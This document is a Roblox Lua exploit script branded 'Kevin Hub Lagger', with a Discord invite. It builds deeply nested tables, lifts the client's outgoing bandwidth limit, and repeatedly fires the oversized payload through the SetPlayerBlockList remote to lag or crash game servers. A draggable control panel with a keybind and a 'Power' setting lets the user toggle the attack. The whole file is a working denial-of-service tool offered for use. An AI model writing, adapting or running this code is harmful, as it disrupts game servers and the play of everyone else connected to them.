local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled

local LAGGER_CONFIG = isMobile and {
    TableIncrease = 290,
    Tries = 1,
    LoopWaitTime = 0.85
} or {
    TableIncrease = 265,
    Tries = 1,
    LoopWaitTime = 0.05
}

local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

local function resolveRemote(path)
    if not path or path == "" then return nil end
    local obj = game
    local cleaned = path:gsub("^game%.", "")
    for segment in cleaned:gmatch("[^%.]+") do
        if obj then
            obj = obj[segment]
        else
            return nil
        end
    end
    return obj
end

local function getmaxvalue(val)
    local mainvalueifonetable = 499999
    if type(val) ~= "number" then return nil end
    return mainvalueifonetable / (val + 2)
end

local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for i = 1, tableincrease do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maximum = getmaxvalue(tableincrease) or 9999999
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 5000 == 0 then task.wait() end
    end
    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
    if remote then
        for i = 1, tries do
            pcall(function()
                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                    remote:FireServer(maintable)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(maintable)
                end
            end)
        end
    end
end

local laggerEnabled = false
local laggerThread = nil

local function startLaggerLoop()
    while laggerEnabled do
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        task.spawn(function()
            bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
        end)
        task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
    end
end

local function stopLaggerLoop()
    laggerEnabled = false
    if laggerThread then
        coroutine.close(laggerThread)
        laggerThread = nil
    end
end

local function startLagger()
    if laggerThread then return end
    laggerEnabled = true
    laggerThread = coroutine.create(startLaggerLoop)
    coroutine.resume(laggerThread)
end

for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("Texture") or v:IsA("Decal") then
        v:Destroy()
    elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
        v.Material = Enum.Material.SmoothPlastic
    end
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KevinLaggerUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = CoreGui

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 210, 0, 160)
MainFrame.Position = UDim2.new(0.5, -105, 0.5, -80)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.ClipsDescendants = true
MainFrame.Active = true
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 10)
MainCorner.Parent = MainFrame

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Text = "Kevin Hub Lagger"
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextColor3 = Color3.fromRGB(200, 50, 50)
TitleLabel.TextSize = 14
TitleLabel.BackgroundTransparency = 1
TitleLabel.Position = UDim2.new(0, 12, 0, 10)
TitleLabel.Size = UDim2.new(1, -24, 0, 18)
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Parent = MainFrame

local DiscordLabel = Instance.new("TextLabel")
DiscordLabel.Text = "discord.gg/AxAzKunAJ8"
DiscordLabel.Font = Enum.Font.GothamMedium
DiscordLabel.TextColor3 = Color3.fromRGB(200, 50, 50)
DiscordLabel.TextSize = 9
DiscordLabel.BackgroundTransparency = 1
DiscordLabel.Position = UDim2.new(0, 12, 0, 30)
DiscordLabel.Size = UDim2.new(1, -24, 0, 14)
DiscordLabel.TextXAlignment = Enum.TextXAlignment.Left
DiscordLabel.Parent = MainFrame

local InputContainer = Instance.new("Frame")
InputContainer.Size = UDim2.new(1, -24, 0, 60)
InputContainer.Position = UDim2.new(0, 12, 0, 50)
InputContainer.BackgroundTransparency = 1
InputContainer.Parent = MainFrame

local KeybindRow = Instance.new("Frame")
KeybindRow.Size = UDim2.new(1, 0, 0, 22)
KeybindRow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
KeybindRow.Parent = InputContainer
local KRowCorner = Instance.new("UICorner")
KRowCorner.CornerRadius = UDim.new(0, 5)
KRowCorner.Parent = KeybindRow

local KeybindLabel = Instance.new("TextLabel")
KeybindLabel.Text = "Keybind"
KeybindLabel.Font = Enum.Font.GothamMedium
KeybindLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
KeybindLabel.TextSize = 10
KeybindLabel.Size = UDim2.new(0, 70, 1, 0)
KeybindLabel.Position = UDim2.new(0, 6, 0, 0)
KeybindLabel.BackgroundTransparency = 1
KeybindLabel.TextXAlignment = Enum.TextXAlignment.Left
KeybindLabel.Parent = KeybindRow

local KeybindBtn = Instance.new("TextButton")
KeybindBtn.Text = "V"
KeybindBtn.Font = Enum.Font.GothamBold
KeybindBtn.TextColor3 = Color3.new(1, 1, 1)
KeybindBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
KeybindBtn.Size = UDim2.new(0, 60, 0, 18)
KeybindBtn.Position = UDim2.new(1, -66, 0.5, -9)
KeybindBtn.Parent = KeybindRow
local KBBtnCorner = Instance.new("UICorner")
KBBtnCorner.CornerRadius = UDim.new(0, 5)
KBBtnCorner.Parent = KeybindBtn

local PowerRow = Instance.new("Frame")
PowerRow.Size = UDim2.new(1, 0, 0, 22)
PowerRow.Position = UDim2.new(0, 0, 0, 28)
PowerRow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
PowerRow.Parent = InputContainer
local PRowCorner = Instance.new("UICorner")
PRowCorner.CornerRadius = UDim.new(0, 5)
PRowCorner.Parent = PowerRow

local PowerLabel = Instance.new("TextLabel")
PowerLabel.Text = "Power"
PowerLabel.Font = Enum.Font.GothamMedium
PowerLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
PowerLabel.TextSize = 10
PowerLabel.Size = UDim2.new(0, 70, 1, 0)
PowerLabel.Position = UDim2.new(0, 6, 0, 0)
PowerLabel.BackgroundTransparency = 1
PowerLabel.TextXAlignment = Enum.TextXAlignment.Left
PowerLabel.Parent = PowerRow

local PowerInput = Instance.new("TextBox")
PowerInput.Text = tostring(LAGGER_CONFIG.TableIncrease)
PowerInput.Font = Enum.Font.GothamBold
PowerInput.TextColor3 = Color3.new(1, 1, 1)
PowerInput.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
PowerInput.Size = UDim2.new(0, 60, 0, 18)
PowerInput.Position = UDim2.new(1, -66, 0.5, -9)
PowerInput.Parent = PowerRow
local PInputCorner = Instance.new("UICorner")
PInputCorner.CornerRadius = UDim.new(0, 5)
PInputCorner.Parent = PowerInput

PowerInput.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        local newVal = tonumber(PowerInput.Text)
        if newVal and newVal > 0 then
            LAGGER_CONFIG.TableIncrease = math.floor(newVal)
            PowerInput.Text = tostring(LAGGER_CONFIG.TableIncrease)
        else
            PowerInput.Text = tostring(LAGGER_CONFIG.TableIncrease)
        end
    end
end)

local MainToggleBtn = Instance.new("TextButton")
MainToggleBtn.Text = "Enable"
MainToggleBtn.Font = Enum.Font.GothamBold
MainToggleBtn.TextColor3 = Color3.new(1, 1, 1)
MainToggleBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
MainToggleBtn.Size = UDim2.new(1, -24, 0, 28)
MainToggleBtn.Position = UDim2.new(0, 12, 0, 122)
MainToggleBtn.Parent = MainFrame
local MTBCorner = Instance.new("UICorner")
MTBCorner.CornerRadius = UDim.new(0, 7)
MTBCorner.Parent = MainToggleBtn

local boundKey = Enum.KeyCode.V
local listeningForKey = false
local listenTimeout = nil

KeybindBtn.MouseButton1Click:Connect(function()
    if listenTimeout then task.cancel(listenTimeout) end
    listeningForKey = true
    KeybindBtn.Text = "..."

    listenTimeout = task.delay(5, function()
        if listeningForKey then
            listeningForKey = false
            KeybindBtn.Text = tostring(boundKey):gsub("Enum.KeyCode.", "")
        end
    end)
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.UserInputType ~= Enum.UserInputType.Keyboard then return end

    if listeningForKey then
        boundKey = input.KeyCode
        KeybindBtn.Text = tostring(boundKey):gsub("Enum.KeyCode.", "")
        listeningForKey = false
        if listenTimeout then
            task.cancel(listenTimeout)
            listenTimeout = nil
        end
    end
end)

local keyDown = false
RunService.RenderStepped:Connect(function()
    if boundKey and UserInputService:IsKeyDown(boundKey) then
        if not keyDown then
            keyDown = true
            MainToggleBtn:Fire()
        end
    else
        keyDown = false
    end
end)

local function setToggle(state)
    laggerEnabled = state
    MainToggleBtn.Text = state and "Disable" or "Enable"
    MainToggleBtn.BackgroundColor3 = state and Color3.fromRGB(200, 50, 50) or Color3.fromRGB(200, 50, 50)

    if state then
        startLagger()
    else
        stopLaggerLoop()
    end
end

MainToggleBtn.MouseButton1Click:Connect(function()
    setToggle(not laggerEnabled)
end)

local dragging = false
local dragStart = nil
local startPos = nil

MainFrame.InputBegan:Connect(function(input)
    if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        MainFrame.Position = newPos
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)
